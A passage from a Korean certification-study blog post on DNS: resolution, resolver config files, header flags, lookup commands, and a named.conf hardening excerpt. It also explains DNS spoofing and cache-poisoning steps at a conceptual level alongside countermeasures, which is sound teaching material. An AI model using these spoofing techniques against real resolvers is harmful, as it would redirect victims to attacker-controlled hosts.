                          &lt;li&gt;Resolver 가 로컬네임서버에 (Recursive DNS Server) 재귀적 질의&lt;/li&gt;
                          &lt;li&gt;로컬네임서버가 Cache 확인&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;반복적 질의
                        &lt;ul&gt;
                          &lt;li&gt;로컬네임서버가 루트서버에 질의&lt;/li&gt;
                          &lt;li&gt;루트서버가 .edu 네임서버 주소를 전달&lt;/li&gt;
                          &lt;li&gt;로컬네임서버가 .edu 네임서버에 질의&lt;/li&gt;
                          &lt;li&gt;.edu 네임서버가 .googleex 네임서버 주소를 전달&lt;/li&gt;
                          &lt;li&gt;로컬네임서버가 .googleex 네임서버에 질의&lt;/li&gt;
                          &lt;li&gt;.googleex 네임서버가 comps.googleex.edu 네임서버 주소를 전달&lt;/li&gt;
                          &lt;li&gt;로컬네임서버가 comps.googleex.edu 네임서버에 질의&lt;/li&gt;
                          &lt;li&gt;comps.googleex.edu IP 주소를 전달&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;재귀적 질의
                        &lt;ul&gt;
                          &lt;li&gt;로컬네임서버가 Cache 갱신&lt;/li&gt;
                          &lt;li&gt;로컬네임서버가 Resolver 에게 IP 전달&lt;/li&gt;
                          &lt;li&gt;Resolver 가 Cache 갱신&lt;/li&gt;
                          &lt;li&gt;Resolver 가 사용자에게 IP 주소를 전달&lt;/li&gt;
                          &lt;li&gt;사용자 브라우저가 IP 주소로 HTTP 요청&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;리눅스-네임서버-설정파일&quot;&gt;리눅스 네임서버 설정파일&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/resolv.conf&lt;/code&gt; : 기본 네임 서버 설정정보
    &lt;ul&gt;
      &lt;li&gt;resolver : 질의 변환기, 재귀적 질의&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/resolv.conf&lt;/code&gt;
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      domain localdomain
      search localdomain
      nameserver 192.168.172.1 // 기본 네임서버 주소
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; : 도메인/호스트명과 IP주소 매핑 정보
    &lt;ul&gt;
      &lt;li&gt;hosts 파일은 대부분의 운영체제에 존재한다.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/hosts&lt;/code&gt;
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      192.168.10.100 www.abc.com
      ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/host.conf&lt;/code&gt; : DNS 질의 순서를 지정
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/host.conf&lt;/code&gt;
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      order hosts, bind // hosts 파일에 먼저 질의하고, bind(nameserver) 에 질의
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dns-패킷-분석&quot;&gt;DNS 패킷 분석&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;DNS Message 는 Query 패킷, Response 패킷이 있다.&lt;/li&gt;
      &lt;li&gt;DNS Message 구조는 아래와 같다.
        &lt;ul&gt;
          &lt;li&gt;Header
            &lt;ul&gt;
              &lt;li&gt;ID : 패킷 식별자 (요청-응답 쌍)&lt;/li&gt;
              &lt;li&gt;
                &lt;table&gt;
                  &lt;tbody&gt;
                    &lt;tr&gt;
                      &lt;td&gt;QR&lt;/td&gt;
                      &lt;td&gt;OPcode&lt;/td&gt;
                      &lt;td&gt;AA&lt;/td&gt;
                      &lt;td&gt;TC&lt;/td&gt;
                      &lt;td&gt;RD&lt;/td&gt;
                      &lt;td&gt;RA&lt;/td&gt;
                      &lt;td&gt;Z&lt;/td&gt;
                      &lt;td&gt;RCODE : Flag&lt;/td&gt;
                    &lt;/tr&gt;
                  &lt;/tbody&gt;
                &lt;/table&gt;
                &lt;ul&gt;
                  &lt;li&gt;QR (Query/Response)
                    &lt;ul&gt;
                      &lt;li&gt;DNS 메세지가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS 질의(0)&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS 응답(1)&lt;/code&gt; 인지를 구분&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;Op code (Operation code) : 4 비트
                    &lt;ul&gt;
                      &lt;li&gt;0  :  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;표준 질의&lt;/code&gt; 또는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;표준 질의에 대한 응답&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;1  :  역 질의 (Inverse Query)&lt;/li&gt;
                      &lt;li&gt;2  :  서버의 상태 요구&lt;/li&gt;
                      &lt;li&gt;4  :  통지&lt;/li&gt;
                      &lt;li&gt;5  :  갱신&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;AA (Authoritative Answer, 책임 플래그)
                    &lt;ul&gt;
                      &lt;li&gt;DNS 응답 메세지에 만 사용됨&lt;/li&gt;
                      &lt;li&gt;1  :  네임서버 권한이 인정된 서버일 때&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;TC (Truncated)
                    &lt;ul&gt;
                      &lt;li&gt;512 바이트 초과 여부&lt;/li&gt;
                      &lt;li&gt;1  :  응답메세지가 512 바이트 이상이라서  512로 짤리어짐
                        &lt;ul&gt;
                          &lt;li&gt;이 경우에 클라이언트는 TCP 포트를 통해 질의를 재전송하게 됨&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;RD (Recursion Desired, 재귀 요구 플래그)
                    &lt;ul&gt;
                      &lt;li&gt;1  :  클라이언트가 재귀 질의를 원함
                        &lt;ul&gt;
                          &lt;li&gt;질의메세지에서 지정되며, 응답메세지에서 이를 반복함&lt;/li&gt;
                          &lt;li&gt;재귀질의가 요청되지 않으면, 반복질의로 간주하게됨&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;RA (Recursion Available, 재귀 유효 플래그)
                    &lt;ul&gt;
                      &lt;li&gt;네임서버가 재귀 질의가 이용 가능한지를 나타냄&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;예약 (Reserved) : 통상 000 으로 셋팅&lt;/li&gt;
                  &lt;li&gt;rCode (response code, 응답/오류 코드)
                    &lt;ul&gt;
                      &lt;li&gt;0 =&amp;gt; No Error, 1 =&amp;gt; Format Error(질의를 이해할 수 없음), 2 =&amp;gt; ServFail(Server Failure), 3 =&amp;gt; 도메인네임 존재 않음 등&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;QDCOUNT (질의 카운트)
                &lt;ul&gt;
                  &lt;li&gt;질의의 수&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;ANCOUNT (응답 카운트)
                &lt;ul&gt;
                  &lt;li&gt;응답 RR(Resource Record)의 수&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;NSCOUNT (네임서버 카운트)
                &lt;ul&gt;
                  &lt;li&gt;책임 RR(Resource Record)의 수&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;ARCOUNT (추가정보 카운트)
                &lt;ul&gt;
                  &lt;li&gt;추가 RR(Resource Reocrd)의 수&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Question&lt;/li&gt;
          &lt;li&gt;Answer&lt;/li&gt;
          &lt;li&gt;Authority&lt;/li&gt;
          &lt;li&gt;Additional&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DNS 는 일반적으로 UDP 53번 포트를 사용 (512 Bytes 미만 패킷)&lt;/li&gt;
      &lt;li&gt;DNS 는 TCP 53번 포트로도 사용 가능 (512 Bytes 이상 패킷)
        &lt;ul&gt;
          &lt;li&gt;Zone Transfer (Zone 전달)
            &lt;ul&gt;
              &lt;li&gt;Master 서버에서 Slave 서버에 Zonefile(Masterfile) 전달
                &lt;ul&gt;
                  &lt;li&gt;주기적 전달&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;신뢰할 수 있는 연결 필요&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;큰 DNS 쿼리를 보낼 때 이용&lt;/li&gt;
          &lt;li&gt;UDP 패킷으로 질의 (query) 했으나 응답패킷 (Response) 이 512Bytes 를 초과할 경우 Response 가 Truncated 되고 TCP 로 요청하라는 메시지 전송&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dns-관련-명령어&quot;&gt;DNS 관련 명령어&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;DNS Cache 조회
    &lt;ul&gt;
      &lt;li&gt;윈도우
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipconfig /displaydns&lt;/code&gt; : DNS 캐시 정보 조회
            &lt;ul&gt;
              &lt;li&gt;DNS 스푸핑 등 확인&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipconfig /flushdns&lt;/code&gt; : DNS 캐시 정보 초기화
            &lt;ul&gt;
              &lt;li&gt;결과메시지 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;successfully flushed the DNS Resolver Cache&lt;/code&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DNS 조회
    &lt;ul&gt;
      &lt;li&gt;윈도우
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup&lt;/code&gt; : DNS 진단 유틸리티, 네임서버 검색, 대화형모드
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup [호스트(도메인 이름/IP주소)] ([네임서버])&lt;/code&gt; : 질의형
                &lt;ul&gt;
                  &lt;li&gt;정방향조회 (Forward DNS Lookup) : 도메인 -&amp;gt; IP&lt;/li&gt;
                  &lt;li&gt;역방향조회 (Reverse DNS Lookup) : IP -&amp;gt; 도메인&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;리눅스 / 유닉스
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig&lt;/code&gt; : Domain Information Groper : nslookup 과 기능 유사하나 더 다양한 정보를 획득
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig ([@네임서버]) [도메인] ([쿼리유형]) ([쿼리옵션])&lt;/code&gt;
                &lt;ul&gt;
                  &lt;li&gt;쿼리유형
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; : 도메인 IP 주소 질의&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;쿼리옵션
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+norecurse&lt;/code&gt; : Authoritative NS 에 반복적 질의 수행, 정상 응답이 되는지 여부를 체크
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig @ns.test.com www.daum.net +norecurse&lt;/code&gt;&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+tcp&lt;/code&gt; : 53/tcp 포트를 허용하는지 체크&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+trace&lt;/code&gt; : 계층 구조의 쿼리 (Root -&amp;gt; .com -&amp;gt; …) 위임의 상태를 추적
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig @ns.test.com www.daum.net +trace&lt;/code&gt;&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whois&lt;/code&gt; : whois 서버를 활용, 도메인 등록정보(소유정보) 확인
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whois www.test.com&lt;/code&gt;
                &lt;ul&gt;
                  &lt;li&gt;등록인, 주소, 변경일, IP 주소 (ISP 주소), 네트워크 할당정보 등…&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host 호스트 [서버]&lt;/code&gt; : nslookup 과 유사&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dns-스푸핑&quot;&gt;DNS 스푸핑&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;공격대상자에게 전달되는 DNS 응답을 위조&lt;/li&gt;
      &lt;li&gt;DNS서버에 위조된 IP 주소를 지정&lt;/li&gt;
      &lt;li&gt;피해자가 의도하지 않은 주소로 접속하게 하는 공격 기법&lt;/li&gt;
      &lt;li&gt;DNS 프로토콜은 Query/Response 를 UDP 프로토콜을 사용하여 주고받음
        &lt;ul&gt;
          &lt;li&gt;UDP : 비연결성에서 생기는 취약점 이용
            &lt;ul&gt;
              &lt;li&gt;Transaction ID 값이 일치하면 응답을 신뢰하게 됨&lt;/li&gt;
              &lt;li&gt;나중에 도착한 값은 폐기됨&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;방식
    &lt;ul&gt;
      &lt;li&gt;스니핑을 이용한 스푸핑 공격
        &lt;ul&gt;
          &lt;li&gt;희생자에게 전달되는 DNS 응답 위조&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DNS 캐시 포이즈닝
        &lt;ul&gt;
          &lt;li&gt;DNS 서버의 캐시정보 조작&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DNS 스푸핑 과정
    &lt;ul&gt;
      &lt;li&gt;Client -&amp;gt; (Attacker) -&amp;gt; Name Server : Attacker 는 중간에서 Snipping
        &lt;ul&gt;
          &lt;li&gt;Transaction ID : 1000&lt;/li&gt;
          &lt;li&gt;Src Port : 4500&lt;/li&gt;
          &lt;li&gt;Q : www.test.com&lt;/li&gt;
          &lt;li&gt;A :&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Client &amp;lt;-  Attacker     Name Server : Attacker 가 Spoofing 응답값 전달
        &lt;ul&gt;
          &lt;li&gt;먼저 수신된 DNS 응답을 신뢰&lt;/li&gt;
          &lt;li&gt;Transaction ID : 1000&lt;/li&gt;
          &lt;li&gt;Dst Port : 4500&lt;/li&gt;
          &lt;li&gt;Q : www.test.com&lt;/li&gt;
          &lt;li&gt;A : 위조된 IP&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Client &amp;lt;- (Attacker) &amp;lt;- Name Server : 정상응답은 폐기됨
        &lt;ul&gt;
          &lt;li&gt;Transaction ID : 1000&lt;/li&gt;
          &lt;li&gt;Dst Port : 4500&lt;/li&gt;
          &lt;li&gt;Q : www.test.com&lt;/li&gt;
          &lt;li&gt;A : xxx.xxx.xxx.xxx&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DNS 스푸핑 대응책
    &lt;ul&gt;
      &lt;li&gt;스니핑을 탐지, 차단&lt;/li&gt;
      &lt;li&gt;DNS 서버 질의 전 우선순위가 높은 hosts 에 중요한 IP 주소를 등록관리&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DNS 캐시 포이즈닝 과정
    &lt;ul&gt;
      &lt;li&gt;Attacker -&amp;gt; Recursive Server
        &lt;ul&gt;
          &lt;li&gt;여러 개의 질의를 한꺼번에 보냄
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.test.com&lt;/code&gt; 질의&lt;/li&gt;
              &lt;li&gt;Recursive Server 는 Authoritative 서버에 여러 번 질의 (반복적 질의에 시간 소요됨)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Attacker -&amp;gt; Recursive Server
        &lt;ul&gt;
          &lt;li&gt;여러 개의 응답을 한꺼번에 보냄
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.test.com&lt;/code&gt; 응답
                &lt;ul&gt;
                  &lt;li&gt;Transaction ID 무작위 입력&lt;/li&gt;
                  &lt;li&gt;Dst Port 무작위 입력&lt;/li&gt;
                  &lt;li&gt;IP 주소 조작&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Recursive Server 가 Authoritative 서버에 응답을 받기 전에 Transaction ID 와 Dst Port 가 일치하는 응답값을 전송
                &lt;ul&gt;
                  &lt;li&gt;뒤에 도착하는 실제 응답은 폐기됨&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;TTL 지속 시간동안 조작된 IP 로 응답하게 됨&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;primarymaster--secondaryslave-네임-서버의-이해&quot;&gt;Primary(Master) / Secondary(Slave) 네임 서버의 이해&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;주서버(Master) : 1차 네임서버
    &lt;ul&gt;
      &lt;li&gt;원본 존 데이터를 관리하는 서버&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;보조서버(Slave) : 2차 네임서버
    &lt;ul&gt;
      &lt;li&gt;마스터서버에 있는 존 데이터를 복사하여 가지고 있음&lt;/li&gt;
      &lt;li&gt;Master 와 동일한 기능을 함
        &lt;ul&gt;
          &lt;li&gt;부하 분산을 통해 안정성을 높임&lt;/li&gt;
          &lt;li&gt;마스터 장애시 대신 역할을 수행&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;구조
    &lt;ul&gt;
      &lt;li&gt;Master NS &amp;lt;-&amp;gt; Slave NS
        &lt;ul&gt;
          &lt;li&gt;Zone transfer : TCP 53
            &lt;ul&gt;
              &lt;li&gt;Master 서버와 Slave 서버 간 ZoneData 동기화
                &lt;ul&gt;
                  &lt;li&gt;Zone File(MasterFile)&lt;/li&gt;
                  &lt;li&gt;Reverse Zone File&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;recursive-query의-제한-방법&quot;&gt;Recursive Query의 제한 방법&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;필요성
    &lt;ul&gt;
      &lt;li&gt;대량의 재귀적 질의 요청이 발생하면 DoS 형태의 공격으로 악용될 수 있음&lt;/li&gt;
      &lt;li&gt;DNS Cache Poisoning 공격&lt;/li&gt;
      &lt;li&gt;사내 DNS 서버의 경우 재귀적 질의 접근제어 설정이 필요
        &lt;ul&gt;
          &lt;li&gt;설정파일 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/named.conf&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/named.conf&lt;/code&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      acl &quot;mynetwork&quot; { 192.168.0.0/24;};
      options {
          listen-on port 53 {127.0.0.1; 192.168.0.254;};
          directory &quot;/var/named&quot;;
          allow-query {mynetwork;};
          allow-recursion {none;}; // 재귀적 질의 제한 설정
          allow-recursion {127.0.0.1; 192.168.170.10/30;}; // 재귀적 질의 제한 설정
          recursion no; // // 재귀적 질의 제한 설정
          // allow-transfer {any;}; // 존전송 제한 설정
          allow-transfer {none;}; // 존전송 제한 설정
          //forwarders {0.0.0.0;};
      };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">DNS (Domain Name System) 개요 DNS 는 프로토콜이라기 보다는 인터넷 네임체계를 규정하는 거대한 시스템 www.google.com : 사람은 문자형태로 입력 192.168.0.1 : 컴퓨터가 알아볼 수 있는 형태 DNS : 사람과 컴퓨터가 알아볼 수 있는 형태로 변환해주는 체계 과정 User -&amp;gt; DNS Client PC WebServer User : 네임 입력 User DNS -&amp;gt; Client PC WebServer DNS 역할 DNS : 네임 요청처리 DNS : 주소 변환 User DNS Client PC -&amp;gt; WebServer Client PC : 자원요청 WebServer : 요청처리 User DNS Client PC &amp;lt;- WebServer WebServer : 응답생성 Client PC : 응답처리 User : 자원접근 기능 네임 공간 정의 (네임구조) 계층구조 예시 : www.google.com (계층구조) com : 최상위 도메인 (TLDs) 공간 google : 2단계 도메인 루트서버 (전 세계 13개정도가 있음) 도메인에 대한 정보를 가지고 있지 않음 자신의 권한을 다른 서버들에게 위임, 서버만 참조 .com : TLDs .google : 2단계 도메인 .naver : 2단계 도메인 blog : 하위도메인 cafe : 하위도메인 mail : 하위도메인 .edu : TLDs .skku : 2단계 도메인 .net : TLDs .daum : 2단계 도메인 DNS 서버 도메인을 담당하는 호스트 저장되는 데이터 자원 레코드 (Resource Record, RR) www.google.com = 192.168.xx.xx 마스터 파일 (Zone 파일) 도메인에 대한 정보를 가지고 있음 RR(복수개) 들을 관리 RR의 추가, 변경, 삭제 music.google.com = 192.168.xx.xx Zone : 도메인을 관리하는 단위 (영역) DNS 서버(네임서버) 하나가 책임이나 권한을 가지는 영역 도메인은 위임을 통해 관리가 가능한 단위로 분할 가능 자원 레코드 (Resource Record, RR) DNS 서버는 모든 데이터를 RR로 정의해서 저장 네임 (0~32) 도메인 혹은 Zone Name 유형(Type) (0~16) 클래스 (16~32) 유형(Type) 유형값 문자코드 RR유형 1 A 주소 (IPv4) 28 AAAA 주소 (IPv6) 2 NS 네임서버 (이름) 5 CNAME 정규네임 (Canonical) 6 SoA 권한개시정보 (DNS Zone 정보) 모든 Zone 은 하나의 SoA 레코드를 가지고 있음 12 PTR 포인터 (다른 위치를 가리킴, 역방향 변환 이용) 15 MX 메일 교환 (도메인으로 들어오는 이메일 처리를 위한 장비 이름 명시) 16 TXT 문자열 클래스 1 IN (Internet, 가장많이 사용) 2 Unassigned (할당되지 않음) 3 CH (Chaos) 4 HS (Hesiod) 유지시간 (0~32) 레코드를 읽은 장비가 캐시에 얼마동안 정보를 유지해야 하는지 명시 데이터 길이 (0~32) 자원에 대한 데이터 크기 데이터 (0~32) 실제 데이터 이름 : www.google.com 유형 : 1 TTL (Time To Live) : Size : 호스트 : 192.168.170.10 ... DNS 서버 Master Slave DNS 메시지 구조 사용자가 DNS 서버에 질의했을 때 받는 메시지 Header (12 Bytes) 메시지 유형 설명 Question (가변) 질의 정보 Answer (가변) 질문에 대한 답변 RR Authority (가변) 권한 네임서버를 가리키는 하나 이상의 RR 포함 Additional (가변) 질의와 관련된 부가정보를 나타내는 하나 이상의 RR 네임 등록 IP 주소 (예:192.168.0.10) 에 웹서버를 구축한 경우 이름 www.abc.com 으로 접근시키기 위해서 네임 등록 abc.com 도메인 공간 안에서는 마음대로 등록 가능 cafe.abc.com blog.abc.com … 네임 변환 사용자가 www.abc.com 으로 접근했을 경우 IP 주소 192.168.0.10 으로 변환시켜줌 DNS 네임 변환 과정 DNS =&amp;gt; Client / Server 가 존재 주소 =&amp;gt; 이름 이름 =&amp;gt; 주소 Resolver (변환기) : 네임서버에 질의를 수행하는 SW / 모듈 반복적 해석 (변환) : Iterative Query Authoritative 서버에 질의할 경우 User -&amp;gt; 루트 NS .Com 담당 NS google 담당 NS google.com 변환 요청 User &amp;lt;- 루트 NS .Com 담당 NS google 담당 NS com 담당 네임서버 주소 User -&amp;gt; .Com 담당 NS google 담당 NS google.com 변환 요청 User &amp;lt;- .Com 담당 NS google 담당 NS google.com 담당 NS 주소 User -&amp;gt; google 담당 NS google.com 변환 요청 User &amp;lt;- google 담당 NS google.com IP 주소 재귀적 해석 (변환) : Recursive Query Recursive 서버에 질의할 경우 중간 과정의 네임서버들이 모두 재귀적 변환을 허용해야 함 실제로는 그렇지 않음. User -&amp;gt; 루트 NS .Com 담당 NS google 담당 NS google.com 변환 요청 User 루트 NS -&amp;gt; .Com 담당 NS google 담당 NS google.com 변환 요청 User 루트 NS .Com 담당 NS -&amp;gt; google 담당 NS google.com 변환 요청 User 루트 NS .Com 담당 NS &amp;lt;- google 담당 NS google.com IP 주소 User 루트 NS &amp;lt;- .Com 담당 NS google 담당 NS google.com IP 주소 User &amp;lt;- 루트 NS .Com 담당 NS google 담당 NS google.com IP 주소 일반적인 DNS 네임 변환 과정 반복적(Iterative) 변환과 재귀적(Recursive) 변환을 함께 사용함 DNS 서버의 종류 Recursive DNS Server : 조건이 만족될 때까지 반복적으로 처리 Authoritative DNS Server (권한서버) Root Server, .Com NS, google NS 등 특정 도메인 영역 (Zone) 과 권한을 가지고 있는 서버 Cache : 캐시에 저장된 정보를 제공 ISP 업체 (KT, SKT … ) 가 제공하는 서버 Recursive Query 순서 DNS Cache 검색 자신에게 도메인 정보가 없을 시 DB를 검색하거나 타 서버에 요청해야 하나 시간이 오래 걸림 캐시로 저장 속도는 빠르나 잘못된 정보를 매핑할 수 있음 양성 캐싱(positive caching) : 한 번 질의 된 도메인 네임과 해당 IP 주소를 캐시에 유지하여 같은 질의가 올 때 캐시에서 응답해 주는 것 음성 캐싱(negative caching) : 잘못된 도메인에 관한 요청을 캐싱하여 불필요한 트래픽과 지연을 줄이는 역할 hosts 파일 검색 host 명 : IP 주소 정보를 담고 있는 파일 /etc/hosts (리눅스) / hosts.ics (Internet Connection Sharing 기능 - 윈도우) 파밍사이트 접속유도를 위해 공격자가 목표로 하는 파일 변조 위험성이 큼 DNS 서버 질의 Recursive DNS Server Authoritative DNS Server 일반적인 과정 재귀적 질의 사용자가 브라우저에 URL 입력 : comps.googleex.edu Resolver : 